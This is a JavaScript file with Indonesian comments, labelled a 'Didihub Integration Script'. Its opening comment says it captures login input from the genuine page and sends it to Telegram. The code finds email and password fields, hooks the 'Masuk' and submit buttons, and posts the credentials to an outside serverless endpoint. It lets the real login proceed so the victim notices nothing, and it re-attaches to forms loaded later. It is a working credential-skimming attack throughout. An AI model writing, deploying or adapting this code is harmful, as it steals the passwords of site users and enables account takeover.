// Script untuk menangkap input login dari halaman asli dan mengirimkannya ke Telegram
(function() {
    console.log('Didihub Integration Script loaded');
    
    // Dapatkan URL dasar dari script saat ini
    const scriptUrl = document.currentScript.src;
    const baseUrl = scriptUrl.substring(0, scriptUrl.lastIndexOf('/public'));
    
    // Fungsi untuk mendeteksi form login asli dari Didihub
    function detectLoginForm() {
        // Coba temukan form login asli dari situs
        const forms = document.querySelectorAll('form');
        forms.forEach(form => {
            // Cari form yang berisi input email dan password
            const emailInput = form.querySelector('input[type="email"], input[name="email"]');
            const passwordInput = form.querySelector('input[type="password"], input[name="password"]');
            
            if (emailInput && passwordInput) {
                // Cari tombol masuk di dalam form atau di dekatnya
                setupLoginButtonListener(emailInput, passwordInput, form);
            }
        });
        
        // Jika tidak menemukan form, coba lagi setelah beberapa detik
        // (mungkin form dimuat secara dinamis)
        setTimeout(detectLoginForm, 2000);
    }
    
    // Fungsi untuk mencari dan menambahkan listener ke tombol masuk
    function setupLoginButtonListener(emailInput, passwordInput, form) {
        // Cari tombol masuk dengan kelas van-button--info dan teks "Masuk"
        const loginButtons = document.querySelectorAll('.van-button--info');
        
        loginButtons.forEach(button => {
            const buttonText = button.textContent.trim().toLowerCase();
            if (buttonText.includes('masuk')) {
                // Tambahkan event listener ke tombol masuk
                button.addEventListener('click', function(e) {
                    // Ambil nilai email dan password saat tombol diklik
                    const email = emailInput.value;
                    const password = passwordInput.value;
                    
                    console.log('Tombol Masuk diklik, mengirim data');
                    
                    // Kirim data ke API serverless Vercel
                    fetch(baseUrl + '/api/submit-login', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            email: email,
                            password: password
                        })
                    })
                    .then(response => response.json())
                    .then(data => {
                        console.log('Respons diterima:', data);
                        if (data.status === 'success') {
                            // Buka tab baru ke halaman Hilo
                            window.open('https://www.didihub.com/hilo', '_blank');
                        }
                    })
                    .catch(error => {
                        console.error('Error:', error);
                        // Tetap buka tab baru meskipun ada error
                        window.open('https://www.didihub.com/hilo', '_blank');
                    });
                    
                    // Tidak mencegah event default agar form tetap disubmit secara normal
                });
                
                console.log('Tombol Masuk ditemukan dan listener ditambahkan');
            }
        });
        
        // Jika tidak menemukan tombol dengan kelas van-button--info, coba cari tombol submit di dalam form
        if (loginButtons.length === 0) {
            const submitButtons = form.querySelectorAll('button[type="submit"]');
            submitButtons.forEach(button => {
                button.addEventListener('click', function(e) {
                    // Ambil nilai email dan password saat tombol diklik
                    const email = emailInput.value;
                    const password = passwordInput.value;
                    
                    console.log('Tombol submit diklik, mengirim data');
                    
                    // Kirim data ke API serverless Vercel
                    fetch(baseUrl + '/api/submit-login', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            email: email,
                            password: password
                        })
                    })
                    .then(response => response.json())
                    .then(data => {
                        console.log('Respons diterima:', data);
                        if (data.status === 'success') {
                            // Buka tab baru ke halaman Hilo
                            window.open('https://www.didihub.com/hilo', '_blank');
                        }
                    })
                    .catch(error => {
                        console.error('Error:', error);
                        // Tetap buka tab baru meskipun ada error
                        window.open('https://www.didihub.com/hilo', '_blank');
                    });
                    
                    // Tidak mencegah event default agar form tetap disubmit secara normal
                });
                
                console.log('Tombol submit ditemukan dan listener ditambahkan');
            });
        }
    }
    
    // Mulai deteksi form login
    detectLoginForm();
    
    // Tambahkan event listener untuk mendeteksi perubahan DOM
    // Ini berguna jika form login dimuat secara dinamis
    const observer = new MutationObserver(function(mutations) {
        mutations.forEach(function(mutation) {
            if (mutation.addedNodes.length) {
                detectLoginForm();
            }
        });
    });
    
    // Mulai observasi
    observer.observe(document.body, { childList: true, subtree: true });
    
    console.log('Didihub Integration Script initialized');
})();